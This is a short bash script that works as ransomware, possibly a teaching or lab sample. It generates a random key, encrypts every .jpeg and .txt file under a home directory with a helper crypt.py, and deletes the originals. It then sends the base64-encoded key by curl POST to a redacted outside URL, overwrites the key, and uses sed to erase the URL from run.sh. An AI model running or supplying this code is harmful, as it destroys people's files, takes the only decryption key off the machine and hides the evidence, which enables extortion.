#!bin/bash



dd if=/dev/urandom of=key.bin bs=128 count=1
find ../my_home/ -type f \( -iname '*.jpeg' -o -iname '*.txt' \) -print0 | xargs -0 -n1 -I{} sh -c 'python3 crypt.py encrypt key.bin "{}" ; rm {};'
curl -XPOST -d "$(<key.bin|base64 -w0)" "<REDACTED>"
dd if=/dev/zero of=key.bin bs=128 count=1
sed -i 's/"https[:][^"]*"/"<REDACTED>"/' run.sh
rm key.bin
